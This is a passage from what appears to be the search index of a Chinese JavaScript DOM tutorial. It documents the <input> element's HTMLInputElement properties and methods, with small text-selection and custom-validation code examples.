type=\"text\" id=\"mytextbox\" size=\"20\" value=\"HelloWorld\"/></p> <p><button onclick=\"SelectText()\">\u9009\u62e9\u6587\u672c</button></p> */ function SelectText () { var input = document . getElementById ( 'mytextbox' ); input . focus (); input . setSelectionRange ( 2 , 5 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u4f1a\u9009\u4e2d llo \u4e09\u4e2a\u5b57\u7b26\u3002 \u4e0b\u9762\u662f setCustomValidity() \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* HTML \u4ee3\u7801\u5982\u4e0b <form id=\"form\"> <input id=\"field\" type=\"text\" pattern=\"[a-f,0-9]{4}\" autocomplete=off> </form> */ const form = document . querySelector ( '#form' ); const field = document . querySelector ( '#field' ); form . addEventListener ( 'submit' , ( e ) => { e . preventDefault (); // \u9632\u6b62\u8fd9\u4e2a\u4f8b\u5b50\u53d1\u51fa POST \u8bf7\u6c42 }); field . oninvalid = ( event ) => { event . target . setCustomValidity ( '\u5fc5\u987b\u662f\u4e00\u4e2a 4 \u4f4d\u5341\u516d\u8fdb\u5236\u6570' ); } field . oninput = ( event ) => { event . target . setCustomValidity ( '' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u5165\u6846\u5fc5\u987b\u8f93\u5165\u4e00\u4e2a4\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u6570\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff08\u6bd4\u5982\u8f93\u5165 xxx \uff09\uff0c\u6309\u4e0b\u56de\u8f66\u952e\u4ee5\u540e\uff0c\u5c31\u4f1a\u63d0\u793a\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u4e00\u65e6\u81ea\u5b9a\u4e49\u4e86\u62a5\u9519\u4fe1\u606f\uff0c\u8f93\u5165\u6846\u5c31\u4f1a\u4e00\u76f4\u5904\u4e8e\u6821\u9a8c\u5931\u8d25\u72b6\u6001\uff0c\u56e0\u6b64\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u628a\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u53e6\u5916\uff0c\u4e3a\u4e86\u907f\u514d\u81ea\u52a8\u8865\u5168\u63d0\u793a\u6846\u906e\u4f4f\u62a5\u9519\u4fe1\u606f\uff0c\u5fc5\u987b\u5c06\u8f93\u5165\u6846\u7684 autocomplete \u5c5e\u6027\u5173\u95ed\u3002","title":"input"},{"location":"elements/input/#_1","text":"<input> \u5143\u7d20\u4e3b\u8981\u7528\u4e8e\u8868\u5355\u7ec4\u4ef6\uff0c\u5b83\u7ee7\u627f\u4e86 HTMLInputElement \u63a5\u53e3\u3002","title":" \u5143\u7d20"},{"location":"elements/input/#htmlinputelement","text":"","title":"HTMLInputElement \u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"elements/input/#_2","text":"name \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u540d\u79f0\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 type \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u7c7b\u578b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 disabled \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a <input> \u8282\u70b9\u662f\u5426\u7981\u6b62\u4f7f\u7528\u3002\u4e00\u65e6\u88ab\u7981\u6b62\u4f7f\u7528\uff0c\u8868\u5355\u63d0\u4ea4\u65f6\u4e0d\u4f1a\u5305\u542b\u8be5 <input> \u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 autofocus \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u9875\u9762\u52a0\u8f7d\u65f6\uff0c\u8be5\u5143\u7d20\u662f\u5426\u4f1a\u81ea\u52a8\u83b7\u5f97\u7126\u70b9\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 required \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8be5 <input> \u5143\u7d20\u662f\u5426\u5fc5\u586b\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 value \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 validity \uff1a\u8fd4\u56de\u4e00\u4e2a ValidityState \u5bf9\u8c61\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u6821\u9a8c\u72b6\u6001\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 validationMessage \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u6821\u9a8c\u5931\u8d25\u65f6\uff0c\u7528\u6237\u770b\u5230\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5982\u679c\u8be5\u8282\u70b9\u4e0d\u9700\u8981\u6821\u9a8c\uff0c\u6216\u8005\u901a\u8fc7\u6821\u9a8c\uff0c\u8be5\u5c5e\u6027\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 willValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u8be5 <input> \u5143\u7d20\u662f\u5426\u4f1a\u88ab\u6821\u9a8c\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002","title":"\u7279\u5f81\u5c5e\u6027"},{"location":"elements/input/#_3","text":"form \uff1a\u8fd4\u56de <input> \u5143\u7d20\u6240\u5728\u7684\u8868\u5355\uff08 <form> \uff09\u8282\u70b9\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 formAction \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u7684\u670d\u52a1\u5668\u76ee\u6807\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 action \u5c5e\u6027\u3002 formEncType \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 enctype \u7684\u5c5e\u6027\u3002 formMethod \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\u7684 HTTP \u65b9\u6cd5\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 method \u5c5e\u6027\u3002 formNoValidate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u65f6\uff0c\u662f\u5426\u8981\u8df3\u8fc7\u6821\u9a8c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 formNoValidate \u5c5e\u6027\u3002 formTarget \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8868\u5355\u63d0\u4ea4\u540e\uff0c\u670d\u52a1\u5668\u8fd4\u56de\u6570\u636e\u7684\u6253\u5f00\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f1a\u8986\u76d6\u8868\u5355\u5143\u7d20\u7684 target \u5c5e\u6027\u3002","title":"\u8868\u5355\u76f8\u5173\u5c5e\u6027"},{"location":"elements/input/#_4","text":"\u4ee5\u4e0b\u5c5e\u6027\u53ea\u6709\u5728 <input> \u5143\u7d20\u53ef\u4ee5\u8f93\u5165\u6587\u672c\u65f6\u624d\u6709\u6548\u3002 autocomplete \uff1a\u5b57\u7b26\u4e32 on \u6216 off \uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u8f93\u5165\u5185\u5bb9\u53ef\u4ee5\u88ab\u6d4f\u89c8\u5668\u81ea\u52a8\u8865\u5168\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 maxLength \uff1a\u6574\u6570\uff0c\u8868\u793a\u53ef\u4ee5\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u6700\u5927\u957f\u5ea6\u3002\u5982\u679c\u8bbe\u4e3a\u8d1f\u6574\u6570\uff0c\u4f1a\u62a5\u9519\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 size \uff1a\u6574\u6570\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u663e\u793a\u957f\u5ea6\u3002\u5982\u679c\u7c7b\u578b\u662f text \u6216 password \uff0c\u8be5\u5c5e\u6027\u7684\u5355\u4f4d\u662f\u5b57\u7b26\u4e2a\u6570\uff0c\u5426\u5219\u5355\u4f4d\u662f\u50cf\u7d20\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 pattern \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a <input> \u8282\u70b9\u7684\u503c\u5e94\u8be5\u6ee1\u8db3\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 placeholder \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u5360\u4f4d\u7b26\uff0c\u4f5c\u4e3a\u5bf9\u5143\u7d20\u7684\u63d0\u793a\u3002\u8be5\u5b57\u7b26\u4e32\u4e0d\u80fd\u5305\u542b\u56de\u8f66\u6216\u6362\u884c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 readOnly \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u7528\u6237\u662f\u5426\u53ef\u4ee5\u4fee\u6539\u8be5\u8282\u70b9\u7684\u503c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 min \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8282\u70b9\u7684\u6700\u5c0f\u6570\u503c\u6216\u65e5\u671f\uff0c\u4e14\u4e0d\u80fd\u5927\u4e8e max \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 max \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u8282\u70b9\u7684\u6700\u5927\u6570\u503c\u6216\u65e5\u671f\uff0c\u4e14\u4e0d\u80fd\u5c0f\u4e8e min \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionStart \uff1a\u6574\u6570\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u8fd4\u56de\u5149\u6807\u5728 <input> \u5143\u7d20\u5185\u90e8\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionEnd \uff1a\u6574\u6570\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u7ed3\u675f\u4f4d\u7f6e\u3002\u5982\u679c\u6ca1\u6709\u9009\u4e2d\u6587\u672c\uff0c\u8fd4\u56de\u5149\u6807\u5728 <input> \u5143\u7d20\u5185\u90e8\u7684\u4f4d\u7f6e\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 selectionDirection \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u9009\u4e2d\u6587\u672c\u7684\u65b9\u5411\u3002\u53ef\u80fd\u7684\u503c\u5305\u62ec forward \uff08\u4e0e\u6587\u5b57\u4e66\u5199\u65b9\u5411\u4e00\u81f4\uff09\u3001 backward \uff08\u4e0e\u6587\u5b57\u4e66\u5199\u65b9\u5411\u76f8\u53cd\uff09\u548c none \uff08\u6587\u5b57\u65b9\u5411\u672a\u77e5\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002","title":"\u6587\u672c\u8f93\u5165\u6846\u7684\u7279\u6709\u5c5e\u6027"},{"location":"elements/input/#_5","text":"\u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f\u590d\u9009\u6846\uff08checkbox\uff09\u6216\u5355\u9009\u6846\uff08radio\uff09\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 checked \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u662f\u5426\u9009\u4e2d\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 defaultChecked \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u9ed8\u8ba4\u662f\u5426\u9009\u4e2d\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 indeterminate \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5 <input> \u5143\u7d20\u662f\u5426\u8fd8\u6ca1\u6709\u786e\u5b9a\u7684\u72b6\u6001\u3002\u4e00\u65e6\u7528\u6237\u70b9\u51fb\u8fc7\u4e00\u6b21\uff0c\u8be5\u5c5e\u6027\u5c31\u4f1a\u53d8\u6210 false \uff0c\u8868\u793a\u7528\u6237\u5df2\u7ecf\u7ed9\u51fa\u786e\u5b9a\u7684\u72b6\u6001\u4e86\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002","title":"\u590d\u9009\u6846\u548c\u5355\u9009\u6846\u7684\u7279\u6709\u5c5e\u6027"},{"location":"elements/input/#_6","text":"\u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f image \uff0c\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u56fe\u50cf\u6309\u94ae\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 alt \uff1a\u5b57\u7b26\u4e32\uff0c\u56fe\u50cf\u65e0\u6cd5\u663e\u793a\u65f6\u7684\u66ff\u4ee3\u6587\u672c\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 height \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 src \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u56fe\u7247\u6765\u6e90\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 width \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002","title":"\u56fe\u50cf\u6309\u94ae\u7684\u7279\u6709\u5c5e\u6027"},{"location":"elements/input/#_7","text":"\u5982\u679c <input> \u5143\u7d20\u7684\u7c7b\u578b\u662f file \uff0c\u5c31\u4f1a\u53d8\u6210\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u6309\u94ae\uff0c\u4f1a\u6709\u4e0b\u9762\u7684\u7279\u6709\u5c5e\u6027\u3002 accept \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5143\u7d20\u53ef\u4ee5\u63a5\u53d7\u7684\u6587\u4ef6\u7c7b\u578b\uff0c\u7c7b\u578b\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u8be5\u5c5e\u6027\u53ef\u8bfb\u5199\u3002 files \uff1a\u8fd4\u56de\u4e00\u4e2a FileList \u5b9e\u4f8b\u5bf9\u8c61\uff0c\u5305\u542b\u4e86\u9009\u4e2d\u4e0a\u4f20\u7684\u4e00\u7ec4 File \u5b9e\u4f8b\u5bf9\u8c61\u3002","title":"\u6587\u4ef6\u4e0a\u4f20\u6309\u94ae\u7684\u7279\u6709\u5c5e\u6027"},{"location":"elements/input/#_8","text":"defaultValue \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5 <input> \u8282\u70b9\u7684\u539f\u59cb\u503c\u3002 dirName \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6587\u5b57\u65b9\u5411\u3002 accessKey \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8ba9\u8be5 <input> \u8282\u70b9\u83b7\u5f97\u7126\u70b9\u7684\u67d0\u4e2a\u5b57\u6bcd\u952e\u3002 list \uff1a\u8fd4\u56de\u4e00\u4e2a <datalist> \u8282\u70b9\uff0c\u8be5\u8282\u70b9\u5fc5\u987b\u7ed1\u5b9a <input> \u5143\u7d20\uff0c\u4e14 <input> \u5143\u7d20\u7684\u7c7b\u578b\u5fc5\u987b\u53ef\u4ee5\u8f93\u5165\u6587\u672c\uff0c\u5426\u5219\u65e0\u6548\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 multiple \uff1a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u53ef\u4ee5\u9009\u62e9\u591a\u4e2a\u503c\u3002 labels \uff1a\u8fd4\u56de\u4e00\u4e2a NodeList \u5b9e\u4f8b\uff0c\u4ee3\u8868\u7ed1\u5b9a\u5f53\u524d <input> \u8282\u70b9\u7684 <label> \u5143\u7d20\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 step \uff1a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5728 min \u5c5e\u6027\u5230 max \u5c5e\u6027\u4e4b\u95f4\uff0c\u6bcf\u6b21\u9012\u589e\u6216\u9012\u51cf\u65f6\u7684\u6570\u503c\u6216\u65f6\u95f4\u3002 valueAsDate \uff1a Date \u5b9e\u4f8b\uff0c\u4e00\u65e6\u8bbe\u7f6e\uff0c\u8be5 <input> \u5143\u7d20\u7684\u503c\u4f1a\u88ab\u89e3\u91ca\u4e3a\u6307\u5b9a\u7684\u65e5\u671f\u3002\u5982\u679c\u65e0\u6cd5\u89e3\u6790\u8be5\u5c5e\u6027\u7684\u503c\uff0c <input> \u8282\u70b9\u7684\u503c\u5c06\u662f null \u3002 valueAsNumber \uff1a\u6d6e\u70b9\u6570\uff0c\u5f53\u524d <input> \u5143\u7d20\u7684\u503c\u4f1a\u88ab\u89e3\u6790\u4e3a\u8fd9\u4e2a\u6570\u503c\u3002","title":"\u5176\u4ed6\u5c5e\u6027"},{"location":"elements/input/#htmlinputelement_1","text":"focus() \uff1a\u5f53\u524d <input> \u5143\u7d20\u83b7\u5f97\u7126\u70b9\u3002 blur() \uff1a\u79fb\u9664 <input> \u5143\u7d20\u7684\u7126\u70b9\u3002 select() \uff1a\u9009\u4e2d <input> \u5143\u7d20\u5185\u90e8\u7684\u6240\u6709\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u4e0d\u80fd\u4fdd\u8bc1 <input> \u83b7\u5f97\u7126\u70b9\uff0c\u6700\u597d\u5148\u7528 focus() \u65b9\u6cd5\uff0c\u518d\u7528\u8fd9\u4e2a\u65b9\u6cd5\u3002 click() \uff1a\u6a21\u62df\u9f20\u6807\u70b9\u51fb\u5f53\u524d\u7684 <input> \u5143\u7d20\u3002 setSelectionRange() \uff1a\u9009\u4e2d <input> \u5143\u7d20\u5185\u90e8\u7684\u4e00\u6bb5\u6587\u672c\uff0c\u4f46\u4e0d\u4f1a\u5c06\u7126\u70b9\u8f6c\u79fb\u5230\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5f00\u59cb\u7684\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u7684\u4f4d\u7f6e\uff08\u4e0d\u5305\u62ec\u8be5\u4f4d\u7f6e\uff09\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u9009\u62e9\u7684\u65b9\u5411\uff0c\u6709\u4e09\u4e2a\u53ef\u80fd\u7684\u503c\uff08 forward \u3001 backward \u548c\u9ed8\u8ba4\u503c none \uff09\u3002 setRangeText() \uff1a\u65b0\u6587\u672c\u66ff\u6362\u9009\u4e2d\u7684\u6587\u672c\u3002\u8be5\u65b9\u6cd5\u63a5\u53d7\u56db\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u65b0\u6587\u672c\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u66ff\u6362\u7684\u5f00\u59cb\u4f4d\u7f6e(\u4ece 0 \u5f00\u59cb\u8ba1\u7b97)\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u7ed3\u675f\u4f4d\u7f6e\uff08\u8be5\u4f4d\u7f6e\u4e0d\u5305\u62ec\u5728\u5185\uff09\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u8868\u793a\u66ff\u6362\u540e\u7684\u884c\u4e3a\uff08\u53ef\u9009\uff09\uff0c\u6709\u56db\u4e2a\u53ef\u80fd\u7684\u503c\uff1a select \uff08\u9009\u4e2d\u65b0\u63d2\u5165\u7684\u6587\u672c\uff09\u3001 start \uff08\u5149\u6807\u4f4d\u7f6e\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u524d\uff09\u3001 end \uff08\u5149\u6807\u4f4d\u7f6e\u79fb\u5230\u63d2\u5165\u7684\u6587\u672c\u4e4b\u540e\uff09\u3001 preserve \uff08\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u539f\u5148\u5c31\u6709\u6587\u672c\u88ab\u9009\u4e2d\u4e14\u672c\u6b21\u66ff\u6362\u4f4d\u7f6e\u4e0e\u539f\u5148\u9009\u4e2d\u4f4d\u7f6e\u6709\u4ea4\u96c6\uff0c\u5219\u66ff\u6362\u540e\u540c\u65f6\u9009\u4e2d\u65b0\u63d2\u5165\u7684\u6587\u672c\u4e0e\u539f\u5148\u9009\u4e2d\u7684\u6587\u672c\uff0c\u5426\u5219\u4fdd\u6301\u539f\u5148\u9009\u4e2d\u7684\u6587\u672c\uff09\u3002 setCustomValidity() \uff1a\u8be5\u65b9\u6cd5\u7528\u4e8e\u81ea\u5b9a\u4e49\u6821\u9a8c\u5931\u8d25\u65f6\u7684\u62a5\u9519\u4fe1\u606f\u3002\u5b83\u7684\u53c2\u6570\u5c31\u662f\u62a5\u9519\u7684\u63d0\u793a\u4fe1\u606f\u3002\u6ce8\u610f\uff0c\u4e00\u65e6\u8bbe\u7f6e\u4e86\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\uff0c\u8be5\u5b57\u6bb5\u5c31\u4e0d\u4f1a\u6821\u9a8c\u901a\u8fc7\u4e86\uff0c\u56e0\u6b64\u7528\u6237\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u5c06\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 checkValidity() \uff1a\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u8282\u70b9\u7684\u6821\u9a8c\u7ed3\u679c\u3002\u5982\u679c\u8fd4\u56de false \uff0c\u8868\u793a\u4e0d\u6ee1\u8db3\u6821\u9a8c\u8981\u6c42\uff0c\u5426\u5219\u5c31\u662f\u6821\u9a8c\u6210\u529f\u6216\u4e0d\u5fc5\u6821\u9a8c\u3002 stepDown() \uff1a\u5c06\u5f53\u524d <input> \u8282\u70b9\u7684\u503c\u51cf\u5c11\u4e00\u4e2a\u6b65\u957f\u3002\u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570 n \u4f5c\u4e3a\u53c2\u6570\uff0c\u8868\u793a\u4e00\u6b21\u6027\u51cf\u5c11 n \u4e2a\u6b65\u957f\uff0c\u9ed8\u8ba4\u662f 1 \u3002\u6709\u51e0\u79cd\u60c5\u51b5\u4f1a\u629b\u9519\uff1a\u5f53\u524d <input> \u8282\u70b9\u4e0d\u9002\u5408\u9012\u51cf\u6216\u9012\u589e\u3001\u5f53\u524d\u8282\u70b9\u6ca1\u6709 step \u5c5e\u6027\u3001 <input> \u8282\u70b9\u7684\u503c\u4e0d\u80fd\u8f6c\u4e3a\u6570\u5b57\u3001\u9012\u51cf\u4e4b\u540e\u7684\u503c\u5c0f\u4e8e min \u5c5e\u6027\u6216\u5927\u4e8e max \u5c5e\u6027\u3002 stepUp() \uff1a\u5c06\u5f53\u524d <input> \u8282\u70b9\u7684\u503c\u589e\u52a0\u4e00\u4e2a\u6b65\u957f\u3002\u5176\u4ed6\u4e0e stepDown() \u65b9\u6cd5\u76f8\u540c\u3002 \u4e0b\u9762\u662f setSelectionRange() \u65b9\u6cd5\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 /* HTML \u4ee3\u7801\u5982\u4e0b <p><input type=\"text\" id=\"mytextbox\" size=\"20\" value=\"HelloWorld\"/></p> <p><button onclick=\"SelectText()\">\u9009\u62e9\u6587\u672c</button></p> */ function SelectText () { var input = document . getElementById ( 'mytextbox' ); input . focus (); input . setSelectionRange ( 2 , 5 ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u6309\u94ae\u4ee5\u540e\uff0c\u4f1a\u9009\u4e2d llo \u4e09\u4e2a\u5b57\u7b26\u3002 \u4e0b\u9762\u662f setCustomValidity() \u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* HTML \u4ee3\u7801\u5982\u4e0b <form id=\"form\"> <input id=\"field\" type=\"text\" pattern=\"[a-f,0-9]{4}\" autocomplete=off> </form> */ const form = document . querySelector ( '#form' ); const field = document . querySelector ( '#field' ); form . addEventListener ( 'submit' , ( e ) => { e . preventDefault (); // \u9632\u6b62\u8fd9\u4e2a\u4f8b\u5b50\u53d1\u51fa POST \u8bf7\u6c42 }); field . oninvalid = ( event ) => { event . target . setCustomValidity ( '\u5fc5\u987b\u662f\u4e00\u4e2a 4 \u4f4d\u5341\u516d\u8fdb\u5236\u6570' ); } field . oninput = ( event ) => { event . target . setCustomValidity ( '' ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8f93\u5165\u6846\u5fc5\u987b\u8f93\u5165\u4e00\u4e2a4\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u6570\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6761\u4ef6\uff08\u6bd4\u5982\u8f93\u5165 xxx \uff09\uff0c\u6309\u4e0b\u56de\u8f66\u952e\u4ee5\u540e\uff0c\u5c31\u4f1a\u63d0\u793a\u81ea\u5b9a\u4e49\u7684\u62a5\u9519\u4fe1\u606f\u3002\u4e00\u65e6\u81ea\u5b9a\u4e49\u4e86\u62a5\u9519\u4fe1\u606f\uff0c\u8f93\u5165\u6846\u5c31\u4f1a\u4e00\u76f4\u5904\u4e8e\u6821\u9a8c\u5931\u8d25\u72b6\u6001\uff0c\u56e0\u6b64\u91cd\u65b0\u8f93\u5165\u65f6\uff0c\u5fc5\u987b\u628a\u81ea\u5b9a\u4e49\u62a5\u9519\u4fe1\u606f\u8bbe\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002\u53e6\u5916\uff0c\u4e3a\u4e86\u907f\u514d\u81ea\u52a8\u8865\u5168\u63d0\u793a\u6846\u906e\u4f4f\u62a5\u9519\u4fe1\u606f\uff0c\u5fc5\u987b\u5c06\u8f93\u5165\u6846\u7684 autocomplete \u5c5e\u6027\u5173\u95ed\u3002","title":"HTMLInputElement \u7684\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"elements/option/","text":"\u5143\u7d20 \u00b6 <option> \u5143\u7d20\u8868\u793a\u4e0b\u62c9\u6846\uff08 <select> \uff0c <optgroup> \u6216 <datalist> \uff09\u91cc\u9762\u7684\u4e00\u4e2a\u9009\u9879\u3002\u5b83\u662f HTMLOptionElement \u63a5\u53e3\u7684\u5b9e\u4f8b\u3002 \u5c5e\u6027 \u00b6 \u9664\u4e86\u7ee7\u627f HTMLElement 